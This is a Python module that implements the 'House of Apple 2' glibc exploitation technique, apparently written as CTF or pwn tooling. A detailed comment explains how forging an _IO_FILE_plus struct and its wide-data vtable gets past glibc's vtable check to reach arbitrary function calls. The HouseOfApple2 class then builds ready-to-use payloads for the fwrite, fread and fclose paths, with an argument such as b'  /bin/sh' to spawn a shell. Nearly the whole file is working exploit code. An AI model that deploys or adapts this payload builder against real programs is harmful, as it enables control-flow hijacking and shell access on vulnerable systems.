import struct

#######################################################################
#
# General idea: we corrupt a libc _IO_FILE_plus struct to achieve
# arbitrary function execution.
#
# Workflow:
# 1. Corrupt the vtable so an fwrite/fputs dispatch (vtable + 0x38,
#    __xsputn) lands where we want. This alone would be arbitrary call,
#    except libc validates the vtable pointer:
#    https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/libioP.h#L935
#    The check is only a range check against the __libc_IO_vtables
#    section, with no alignment requirement. So we keep the pointer
#    inside that section but shift it to call _IO_wfile_overflow instead
#    of the intended function
# 2. _IO_wfile_overflow calls _IO_wdoallocbuf
# 3. _IO_wdoallocbuf reads the _wide_data field of the file struct and
#    dispatches through _wide_data->_wide_vtable:
#    https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/libio.h#L144
# 4. It calls _wide_vtable + 0x68 (__doallocate) with NO pointer
#    validation. This is the hole!
# 5. We forge _wide_vtable so that _wide_vtable + 0x68 holds a pointer
#    to the function we want to call.
#
# Memory layout:
# A full _IO_FILE_plus + a full _IO_wide_data, each with its vtable,
# would need a large buffer, so here we overlap both structs and the
# _wide_data_vtable.
#
# Controlling the first argument:
# _IO_wdoallocbuf always calls _wide_vtable + 0x68 with a pointer to the
# file struct as the first argument. So rdi is a pointer to memory we
# control. If the target function dereferences it, we can place the
# pointed data at offset 0 of the file struct. There are some
# constraints on that data:
#
# 1. Don't clobber _lock (offset 0x88): lock must point to a writable,
#    zeroed qword so the lock can be acquired.
# 2. Offset 0 is _flags (4 bytes). The normal _IO_MAGIC high bytes are
#    NOT checked on this path, so their value is free. Only two bits in
#    the low byte must be clear: _IO_UNBUFFERED (0x2) and _IO_NO_WRITES
#    (0x8). Either one set kills the chain. Luckly, two space bytes
#    (b\x20\x20) can keep both clear, so a command like b"  /bin/sh"
#    is valid totally!
#
#######################################################################


class HouseOfApple2:
    def __init__(self, libc_io_wfile_jumps, ptr_to_null):
        self._ptr_to_null = ptr_to_null
        self._libc_io_wfile_jumps = libc_io_wfile_jumps

    def fwrite_payload(self, base_ptr, arbitrary_func, arg=None):
        return self.payload(base_ptr, arbitrary_func, dispatch_offset=0x38, arg=arg)

    def fread_payload(self, base_ptr, arbitrary_func, arg=None):
        return self.payload(base_ptr, arbitrary_func, dispatch_offset=0x40, arg=arg)

    def fclose_payload(self, base_ptr, arbitrary_func, arg=None):
        return self.payload(base_ptr, arbitrary_func, dispatch_offset=0x38, arg=arg)

    def payload(self, base_ptr, arbitrary_func, dispatch_offset=0x38, arg=None):
        io_wfile_overflow = self._libc_io_wfile_jumps + 0x8 * 3
        file_vtable = io_wfile_overflow - dispatch_offset

        file_struct = self._file_struct(file_vtable, base_ptr + 8)
        wide_data_vtable = base_ptr + len(file_struct) - 0x68
        overlapped_struct = self._overlap_wide_data_struct(
            file_struct, wide_data_vtable, arbitrary_func
        )
        payload = self._place_arg(overlapped_struct, arg)

        print(f"file_struct @ {base_ptr:#x}")
        print(f"io_wfile_overflow @ {io_wfile_overflow:#x}")
        print(f"file_vtable @ {file_vtable:#x}")
        print(
            f"io_wfile_overflow @ [file_vtable+dispatch_offset] {file_vtable+dispatch_offset:#x}"
        )
        print(f"wide_data_vtable vtable @ {wide_data_vtable:#x}")
        print(f"arbitrary func @ [wide_data_vtable+0x68] {wide_data_vtable+0x68:#x}")

        return payload

    def _file_struct(self, vtable, wide_data):
        return (
            struct.pack("<I", 0x0)  # _flags
            + struct.pack("<I", 0x0)  # padding
            + struct.pack("<Q", 0x0)  # _IO_read_ptr
            + struct.pack("<Q", 0x0)  # _IO_read_end
            + struct.pack("<Q", 0x0)  # _IO_read_base
            + struct.pack("<Q", 0x0)  # _IO_write_base
            + struct.pack("<Q", 0x0)  # _IO_write_ptr
            + struct.pack("<Q", 0x0)  # _IO_write_end
            + struct.pack("<Q", 0x0)  # _IO_buf_base
            + struct.pack("<Q", 0x0)  # _IO_buf_end
            + struct.pack("<Q", 0x0)  # _IO_save_base
            + struct.pack("<Q", 0x0)  # _IO_backup_base
            + struct.pack("<Q", 0x0)  # _IO_save_end
            + struct.pack("<Q", 0x0)  # _markers
            + struct.pack("<Q", 0x0)  # _chain
            + struct.pack("<I", 0x0)  # _fileno
            + struct.pack("<I", 0x0)  # _flags2
            + struct.pack("<Q", 0xFFFFFFFFFFFFFFFF)  # _old_offset
            + struct.pack("<H", 0x0)  # _cur_column
            + struct.pack("<b", 0x0)  # _vtable_offset
            + struct.pack("<B", 0x0)  # _shortbuf[0]
            + struct.pack("<I", 0x0)  # padding
            + struct.pack("<Q", self._ptr_to_null)  # _lock
            + struct.pack("<Q", 0xFFFFFFFFFFFFFFFF)  # _offset
            + struct.pack("<Q", 0x0)  # _codecvt
            + struct.pack("<Q", wide_data)  # _wide_data
            + struct.pack("<Q", 0x0)  # _freeres_list
            + struct.pack("<Q", 0x0)  # _freeres_buf
            + struct.pack("<Q", 0x0)  # __pad5
            + struct.pack("<I", 0x0)  # _mode
            + b"\x00" * 20  # _unused2
            + struct.pack("<Q", vtable)  # vtable
        )

    def _overlap_wide_data_struct(self, file_struct, wide_data_vtable, arbitrary_func):
        return (
            file_struct
            + struct.pack("<Q", arbitrary_func)
            + struct.pack("<Q", wide_data_vtable)
        )

    def _place_arg(self, overlapped_struct, arg):
        if arg is None:
            return overlapped_struct

        flags_low = int.from_bytes(arg[:4].ljust(4, b"\0"), "little")
        if flags_low & 0x2 or flags_low & 0x8:
            raise ValueError(
                "arg clobbers flags low two bytes _IO_UNBUFFERED(0x2)/_IO_NO_WRITES(0x8). Prefix with spaces (e.g. b'  /bin/sh')"
            )

        if len(arg) > 0x88:
            raise ValueError("arg too long, would clobber the _lock")

        return arg + overlapped_struct[len(arg) :]
